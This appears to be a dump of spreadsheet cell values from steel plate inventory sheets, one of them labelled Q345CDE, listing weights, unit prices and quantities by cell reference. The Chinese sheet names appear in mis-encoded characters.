' ÖÐºñ°åµÍºÏ½ð,E56,"",6.06700000000000017053
' ÖÐºñ°åµÍºÏ½ð,F56,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB56,"",5250.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E57,"",6.43799999999999972289
' ÖÐºñ°åµÍºÏ½ð,F57,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB57,"",5300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E58,"",4.71199999999999974420
' ÖÐºñ°åµÍºÏ½ð,F58,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB58,"",5300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E59,"",4.49600000000000044054
' ÖÐºñ°åµÍºÏ½ð,F59,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB59,"",5400.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB60,"",5600.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E61,"",3.05299999999999993605
' ÖÐºñ°åµÍºÏ½ð,F61,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB61,"",5700.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E62,"",5.02400000000000002132
' ÖÐºñ°åµÍºÏ½ð,F62,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB62,"",5250.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E63,"",4.80799999999999982947
' ÖÐºñ°åµÍºÏ½ð,F63,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB63,"",5350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E64,"",6.62800000000000011369
' ÖÐºñ°åµÍºÏ½ð,F64,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB64,"",5580.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E65,"",6.98200000000000020606
' ÖÐºñ°åµÍºÏ½ð,F65,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB65,"",5610.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E66,"",7.01799999999999979394
' ÖÐºñ°åµÍºÏ½ð,F66,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB66,"",5610.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E67,"",6.98200000000000020606
' ÖÐºñ°åµÍºÏ½ð,F67,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB67,"",5650.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GA68,"",50.24099999999999965894
' ÖÐºñ°åµÍºÏ½ð,GB68,"",5100.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E69,"",7.01799999999999979394
' ÖÐºñ°åµÍºÏ½ð,F69,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E71,"",6.71199999999999974420
' ÖÐºñ°åµÍºÏ½ð,F71,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GA71,"",8.02800000000000046896
' ÖÐºñ°åµÍºÏ½ð,GB71,"",5250.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E72,"",3.63300000000000000711
' ÖÐºñ°åµÍºÏ½ð,F72,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E73,"",8.72400000000000019895
' ÖÐºñ°åµÍºÏ½ð,F73,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GA73,"",6.12300000000000022027
' ÖÐºñ°åµÍºÏ½ð,GB73,"",5250.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GA74,"",234.06590909090908780854
' ÖÐºñ°åµÍºÏ½ð,GB74,"",4680.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E75,"",8.80599999999999916156
' ÖÐºñ°åµÍºÏ½ð,F75,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E76,"",8.67300000000000004263
' ÖÐºñ°åµÍºÏ½ð,F76,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GA76,"",133.25800000000000977707
' ÖÐºñ°åµÍºÏ½ð,GB76,"",4680.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E77,"",7.82699999999999995737
' ÖÐºñ°åµÍºÏ½ð,F77,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GA77,"",44.75600000000000022737
' ÖÐºñ°åµÍºÏ½ð,GB77,"",4680.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E78,"",7.89100000000000001421
' ÖÐºñ°åµÍºÏ½ð,F78,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GA78,"",203.95199999999999818101
' ÖÐºñ°åµÍºÏ½ð,GB78,"",4680.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E79,"",7.70099999999999962341
' ÖÐºñ°åµÍºÏ½ð,F79,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GA79,"",189.51800000000000068212
' ÖÐºñ°åµÍºÏ½ð,GB79,"",4680.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E80,"",7.70099999999999962341
' ÖÐºñ°åµÍºÏ½ð,F80,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GA80,"",118.72400000000000375167
' ÖÐºñ°åµÍºÏ½ð,GB80,"",4680.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E83,"",4.98899999999999987921
' ÖÐºñ°åµÍºÏ½ð,F83,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E84,"",7.86200000000000009948
' ÖÐºñ°åµÍºÏ½ð,F84,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E85,"",7.86200000000000009948
' ÖÐºñ°åµÍºÏ½ð,F85,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E86,"",7.78899999999999970157
' ÖÐºñ°åµÍºÏ½ð,F86,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E87,"",7.91800000000000014921
' ÖÐºñ°åµÍºÏ½ð,F87,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E88,"",7.85299999999999975842
' ÖÐºñ°åµÍºÏ½ð,F88,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E89,"",7.85299999999999975842
' ÖÐºñ°åµÍºÏ½ð,F89,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E90,"",7.64900000000000002132
' ÖÐºñ°åµÍºÏ½ð,F90,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E91,"",7.64900000000000002132
' ÖÐºñ°åµÍºÏ½ð,F91,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E92,"",8.34099999999999930367
' ÖÐºñ°åµÍºÏ½ð,F92,"",4200.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E93,"",12.92900000000000027001
' ÖÐºñ°åµÍºÏ½ð,F93,"",4250.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E94,"",13.24699999999999988631
' ÖÐºñ°åµÍºÏ½ð,F94,"",4250.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E95,"",1.98599999999999998757
' ÖÐºñ°åµÍºÏ½ð,F95,"",4250.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E97,"",1.96300000000000007816
' ÖÐºñ°åµÍºÏ½ð,F97,"",4250.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E98,"",7.75199999999999977973
' ÖÐºñ°åµÍºÏ½ð,F98,"",4250.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E99,"",6.53899999999999970157
' ÖÐºñ°åµÍºÏ½ð,F99,"",4250.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E100,"",9.86899999999999977263
' ÖÐºñ°åµÍºÏ½ð,F100,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E101,"",11.32199999999999917577
' ÖÐºñ°åµÍºÏ½ð,F101,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E102,"",9.76699999999999945999
' ÖÐºñ°åµÍºÏ½ð,F102,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E104,"",13.07300000000000039790
' ÖÐºñ°åµÍºÏ½ð,F104,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E106,"",12.92200000000000059686
' ÖÐºñ°åµÍºÏ½ð,F106,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E107,"",11.83300000000000018474
' ÖÐºñ°åµÍºÏ½ð,F107,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E109,"",14.13599999999999923261
' ÖÐºñ°åµÍºÏ½ð,F109,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E111,"",14.64400000000000012790
' ÖÐºñ°åµÍºÏ½ð,F111,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E112,"",14.60200000000000031264
' ÖÐºñ°åµÍºÏ½ð,F112,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E113,"",13.95700000000000073896
' ÖÐºñ°åµÍºÏ½ð,F113,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E114,"",14.49300000000000032685
' ÖÐºñ°åµÍºÏ½ð,F114,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E115,"",8.96799999999999997158
' ÖÐºñ°åµÍºÏ½ð,F115,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E116,"",8.96799999999999997158
' ÖÐºñ°åµÍºÏ½ð,F116,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E117,"",8.96799999999999997158
' ÖÐºñ°åµÍºÏ½ð,F117,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E118,"",7.45600000000000040501
' ÖÐºñ°åµÍºÏ½ð,F118,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E120,"",8.65600000000000058265
' ÖÐºñ°åµÍºÏ½ð,F120,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E121,"",11.73600000000000065370
' ÖÐºñ°åµÍºÏ½ð,F121,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E124,"",8.92900000000000027001
' ÖÐºñ°åµÍºÏ½ð,F124,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E125,"",8.92900000000000027001
' ÖÐºñ°åµÍºÏ½ð,F125,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E126,"",9.38799999999999990052
' ÖÐºñ°åµÍºÏ½ð,F126,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E127,"",8.92900000000000027001
' ÖÐºñ°åµÍºÏ½ð,F127,"",4300.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E129,"",14.14400000000000012790
' ÖÐºñ°åµÍºÏ½ð,F129,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E130,"",14.14400000000000012790
' ÖÐºñ°åµÍºÏ½ð,F130,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E131,"",12.36400000000000076739
' ÖÐºñ°åµÍºÏ½ð,F131,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E132,"",14.51200000000000045475
' ÖÐºñ°åµÍºÏ½ð,F132,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E133,"",13.77699999999999924682
' ÖÐºñ°åµÍºÏ½ð,F133,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E134,"",14.60299999999999975842
' ÖÐºñ°åµÍºÏ½ð,F134,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E137,"",12.80899999999999927525
' ÖÐºñ°åµÍºÏ½ð,F137,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E139,"",12.21299999999999918998
' ÖÐºñ°åµÍºÏ½ð,F139,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E141,"",12.25099999999999944578
' ÖÐºñ°åµÍºÏ½ð,F141,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E142,"",12.01099999999999923261
' ÖÐºñ°åµÍºÏ½ð,F142,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E143,"",11.83399999999999963052
' ÖÐºñ°åµÍºÏ½ð,F143,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E144,"",13.83200000000000073896
' ÖÐºñ°åµÍºÏ½ð,F144,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E145,"",14.19400000000000083844
' ÖÐºñ°åµÍºÏ½ð,F145,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E148,"",14.30700000000000038369
' ÖÐºñ°åµÍºÏ½ð,F148,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E149,"",12.36400000000000076739
' ÖÐºñ°åµÍºÏ½ð,F149,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E150,"",14.16099999999999958789
' ÖÐºñ°åµÍºÏ½ð,F150,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E151,"",13.15900000000000069633
' ÖÐºñ°åµÍºÏ½ð,F151,"",4350.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E152,"",14.32799999999999940314
' ÖÐºñ°åµÍºÏ½ð,F152,"",4350.00000000000000000000
' ÐÂ¿â´æQ345CDE,E2,"",2.94300000000000006040
' ÐÂ¿â´æQ345CDE,F2,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E3,"",3.48200000000000020606
' ÐÂ¿â´æQ345CDE,F3,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E4,"",6.40200000000000013500
' ÐÂ¿â´æQ345CDE,F4,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E5,"",5.91300000000000025580
' ÐÂ¿â´æQ345CDE,F5,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E6,"",6.28099999999999969447
' ÐÂ¿â´æQ345CDE,F6,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E7,"",6.01700000000000034817
' ÐÂ¿â´æQ345CDE,F7,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E8,"",6.15399999999999991473
' ÐÂ¿â´æQ345CDE,F8,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E9,"",6.42900000000000027001
' ÐÂ¿â´æQ345CDE,F9,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E10,"",6.03399999999999980815
' ÐÂ¿â´æQ345CDE,F10,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E11,"",5.91300000000000025580
' ÐÂ¿â´æQ345CDE,F11,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E14,"",3.23099999999999987210
' ÐÂ¿â´æQ345CDE,F14,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E16,"",3.53100000000000013856
' ÐÂ¿â´æQ345CDE,F16,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E17,"",3.40099999999999980105
' ÐÂ¿â´æQ345CDE,F17,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E18,"",3.40799999999999991829
' ÐÂ¿â´æQ345CDE,F18,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E19,"",3.28600000000000003197
' ÐÂ¿â´æQ345CDE,F19,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E20,"",3.36299999999999998934
' ÐÂ¿â´æQ345CDE,F20,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E21,"",8.75699999999999967315
' ÐÂ¿â´æQ345CDE,F21,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E22,"",8.61599999999999965894
' ÐÂ¿â´æQ345CDE,F22,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E23,"",8.26399999999999934630
' ÐÂ¿â´æQ345CDE,F23,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E24,"",18.67399999999999948841
' ÐÂ¿â´æQ345CDE,F24,"",2.00000000000000000000
' ÐÂ¿â´æQ345CDE,E25,"",3.92300000000000004263
' ÐÂ¿â´æQ345CDE,F25,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E26,"",2.55900000000000016342
' ÐÂ¿â´æQ345CDE,F26,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E27,"",7.24099999999999965894
' ÐÂ¿â´æQ345CDE,F27,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E28,"",8.16399999999999970157
' ÐÂ¿â´æQ345CDE,F28,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E29,"",8.98799999999999954525
' ÐÂ¿â´æQ345CDE,F29,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E30,"",8.33300000000000018474
' ÐÂ¿â´æQ345CDE,F30,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E31,"",8.47799999999999975842
' ÐÂ¿â´æQ345CDE,F31,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E32,"",8.18599999999999994316
' ÐÂ¿â´æQ345CDE,F32,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E33,"",7.94399999999999995026
' ÐÂ¿â´æQ345CDE,F33,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E34,"",5.65200000000000013500
' ÐÂ¿â´æQ345CDE,F34,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E35,"",5.65200000000000013500
' ÐÂ¿â´æQ345CDE,F35,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E36,"",6.55900000000000016342
' ÐÂ¿â´æQ345CDE,F36,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E37,"",8.14100000000000001421
' ÐÂ¿â´æQ345CDE,F37,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E38,"",9.65799999999999947420
' ÐÂ¿â´æQ345CDE,F38,"",2.00000000000000000000
' ÐÂ¿â´æQ345CDE,E39,"",8.45400000000000062528
' ÐÂ¿â´æQ345CDE,F39,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E40,"",8.34699999999999953104
' ÐÂ¿â´æQ345CDE,F40,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E41,"",8.65300000000000046896
' ÐÂ¿â´æQ345CDE,F41,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E43,"",8.40099999999999980105
' ÐÂ¿â´æQ345CDE,F43,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E44,"",8.53299999999999947420
' ÐÂ¿â´æQ345CDE,F44,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E45,"",6.53300000000000036238
' ÐÂ¿â´æQ345CDE,F45,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E47,"",8.22799999999999975842
' ÐÂ¿â´æQ345CDE,F47,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E49,"",7.84199999999999963762
' ÐÂ¿â´æQ345CDE,F49,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E50,"",10.65099999999999980105
' ÐÂ¿â´æQ345CDE,F50,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E51,"",6.53300000000000036238
' ÐÂ¿â´æQ345CDE,F51,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E52,"",10.52399999999999913314
' ÐÂ¿â´æQ345CDE,F52,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E54,"",8.86700000000000088107
' ÐÂ¿â´æQ345CDE,F54,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E55,"",8.15799999999999947420
' ÐÂ¿â´æQ345CDE,F55,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E56,"",8.54599999999999937472
' ÐÂ¿â´æQ345CDE,F56,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E58,"",6.53300000000000036238
' ÐÂ¿â´æQ345CDE,F58,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E59,"",8.41200000000000081002
' ÐÂ¿â´æQ345CDE,F59,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E62,"",8.76099999999999923261
' ÐÂ¿â´æQ345CDE,F62,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E64,"",8.83099999999999951683
' ÐÂ¿â´æQ345CDE,F64,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E65,"",8.12100000000000044054
' ÐÂ¿â´æQ345CDE,F65,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E66,"",9.44899999999999984368
' ÐÂ¿â´æQ345CDE,F66,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E67,"",8.55799999999999982947
' ÐÂ¿â´æQ345CDE,F67,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E68,"",10.23199999999999931788
' ÐÂ¿â´æQ345CDE,F68,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E69,"",10.23199999999999931788
' ÐÂ¿â´æQ345CDE,F69,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E70,"",20.92399999999999948841
' ÐÂ¿â´æQ345CDE,F70,"",2.00000000000000000000
' ÐÂ¿â´æQ345CDE,E71,"",8.26399999999999934630
' ÐÂ¿â´æQ345CDE,F71,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E72,"",8.24799999999999933209
' ÐÂ¿â´æQ345CDE,F72,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E73,"",11.04700000000000059686
' ÐÂ¿â´æQ345CDE,F73,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E74,"",6.21699999999999963762
' ÐÂ¿â´æQ345CDE,F74,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E75,"",10.04700000000000059686
' ÐÂ¿â´æQ345CDE,F75,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E77,"",8.77100000000000079581
' ÐÂ¿â´æQ345CDE,F77,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E78,"",8.67699999999999960210
' ÐÂ¿â´æQ345CDE,F78,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E79,"",8.38799999999999990052
' ÐÂ¿â´æQ345CDE,F79,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E80,"",10.16900000000000048317
' ÐÂ¿â´æQ345CDE,F80,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E81,"",8.70800000000000018474
' ÐÂ¿â´æQ345CDE,F81,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E82,"",8.52399999999999913314
' ÐÂ¿â´æQ345CDE,F82,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E85,"",20.92399999999999948841
' ÐÂ¿â´æQ345CDE,F85,"",2.00000000000000000000
' ÐÂ¿â´æQ345CDE,E86,"",8.14100000000000001421
' ÐÂ¿â´æQ345CDE,F86,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E87,"",11.63700000000000045475
' ÐÂ¿â´æQ345CDE,F87,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E88,"",8.89799999999999968736
' ÐÂ¿â´æQ345CDE,F88,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E89,"",8.17699999999999960210
' ÐÂ¿â´æQ345CDE,F89,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E91,"",10.40199999999999924682
' ÐÂ¿â´æQ345CDE,F91,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E93,"",21.84799999999999897682
' ÐÂ¿â´æQ345CDE,F93,"",2.00000000000000000000
' ÐÂ¿â´æQ345CDE,E94,"",9.10899999999999998579
' ÐÂ¿â´æQ345CDE,F94,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E95,"",7.89100000000000001421
' ÐÂ¿â´æQ345CDE,F95,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E96,"",10.69299999999999961631
' ÐÂ¿â´æQ345CDE,F96,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E97,"",8.52200000000000024158
' ÐÂ¿â´æQ345CDE,F97,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E98,"",8.98799999999999954525
' ÐÂ¿â´æQ345CDE,F98,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E99,"",10.46199999999999974420
' ÐÂ¿â´æQ345CDE,F99,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E101,"",6.21699999999999963762
' ÐÂ¿â´æQ345CDE,F101,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E102,"",10.73900000000000076739
' ÐÂ¿â´æQ345CDE,F102,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E103,"",9.02100000000000079581
' ÐÂ¿â´æQ345CDE,F103,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E104,"",9.03200000000000002842
' ÐÂ¿â´æQ345CDE,F104,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E105,"",8.30799999999999982947
' ÐÂ¿â´æQ345CDE,F105,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E106,"",10.46199999999999974420
' ÐÂ¿â´æQ345CDE,F106,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E107,"",8.52800000000000046896
' ÐÂ¿â´æQ345CDE,F107,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E108,"",8.69299999999999961631
' ÐÂ¿â´æQ345CDE,F108,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E109,"",10.46199999999999974420
' ÐÂ¿â´æQ345CDE,F109,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E110,"",11.54100000000000036948
' ÐÂ¿â´æQ345CDE,F110,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E111,"",8.24300000000000032685
' ÐÂ¿â´æQ345CDE,F111,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E112,"",9.07900000000000062528
' ÐÂ¿â´æQ345CDE,F112,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,E114,[],""
' ÐÂ¿â´æQ345CDE,F114,"",5.00000000000000000000
' ÐÂ¿â´æQ345CDE,G114,[],""
' ÐÂ¿â´æQ345CDE,E115,[],""
' ÐÂ¿â´æQ345CDE,F115,"",6.00000000000000000000
' ÐÂ¿â´æQ345CDE,G115,[],""
' ÐÂ¿â´æQ345CDE,E116,[],""
' ÐÂ¿â´æQ345CDE,F116,"",9.00000000000000000000
' ÐÂ¿â´æQ345CDE,G116,[],""
' ÐÂ¿â´æQ345CDE,E117,[],""
' ÐÂ¿â´æQ345CDE,F117,"",34.00000000000000000000
' ÐÂ¿â´æQ345CDE,G117,[],""
' ÐÂ¿â´æQ345CDE,E118,[],""
' ÐÂ¿â´æQ345CDE,F118,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,G118,[],""
' ÐÂ¿â´æQ345CDE,E119,[],""
' ÐÂ¿â´æQ345CDE,F119,"",9.00000000000000000000
' ÐÂ¿â´æQ345CDE,G119,[],""
' ÐÂ¿â´æQ345CDE,E120,[],""
' ÐÂ¿â´æQ345CDE,F120,"",40.00000000000000000000
' ÐÂ¿â´æQ345CDE,G120,[],""
' ÐÂ¿â´æQ345CDE,E121,[],""
' ÐÂ¿â´æQ345CDE,F121,"",8.00000000000000000000
' ÐÂ¿â´æQ345CDE,G121,[],""
' ÐÂ¿â´æQ345CDE,E122,[],""
' ÐÂ¿â´æQ345CDE,F122,"",32.00000000000000000000
' ÐÂ¿â´æQ345CDE,G122,[],""
' ÐÂ¿â´æQ345CDE,E123,[],""
' ÐÂ¿â´æQ345CDE,F123,"",11.00000000000000000000
' ÐÂ¿â´æQ345CDE,G123,[],""
' ÐÂ¿â´æQ345CDE,E124,[],""
' ÐÂ¿â´æQ345CDE,F124,"",2.00000000000000000000
' ÐÂ¿â´æQ345CDE,G124,[],""
' ÐÂ¿â´æQ345CDE,E125,[],""
' ÐÂ¿â´æQ345CDE,F125,"",14.00000000000000000000
' ÐÂ¿â´æQ345CDE,G125,[],""
' ÐÂ¿â´æQ345CDE,E126,[],""
' ÐÂ¿â´æQ345CDE,F126,"",9.00000000000000000000
' ÐÂ¿â´æQ345CDE,G126,[],""
' ÐÂ¿â´æQ345CDE,E127,[],""
' ÐÂ¿â´æQ345CDE,F127,"",12.00000000000000000000
' ÐÂ¿â´æQ345CDE,G127,[],""
' ÐÂ¿â´æQ345CDE,E128,[],""
' ÐÂ¿â´æQ345CDE,F128,"",11.00000000000000000000
' ÐÂ¿â´æQ345CDE,G128,[],""
' ÐÂ¿â´æQ345CDE,E129,[],""
' ÐÂ¿â´æQ345CDE,F129,"",11.00000000000000000000
' ÐÂ¿â´æQ345CDE,G129,[],""
' ÐÂ¿â´æQ345CDE,E130,[],""
' ÐÂ¿â´æQ345CDE,F130,"",16.00000000000000000000
' ÐÂ¿â´æQ345CDE,G130,[],""
' ÐÂ¿â´æQ345CDE,E131,[],""
' ÐÂ¿â´æQ345CDE,F131,"",5.00000000000000000000
' ÐÂ¿â´æQ345CDE,G131,[],""
' ÐÂ¿â´æQ345CDE,E132,[],""
' ÐÂ¿â´æQ345CDE,F132,"",3.00000000000000000000
' ÐÂ¿â´æQ345CDE,G132,[],""
' ÐÂ¿â´æQ345CDE,E133,[],""
' ÐÂ¿â´æQ345CDE,F133,"",1.00000000000000000000
' ÐÂ¿â´æQ345CDE,G133,[],""
' ÐÂ¿â´æQ345CDE,E134,[],""
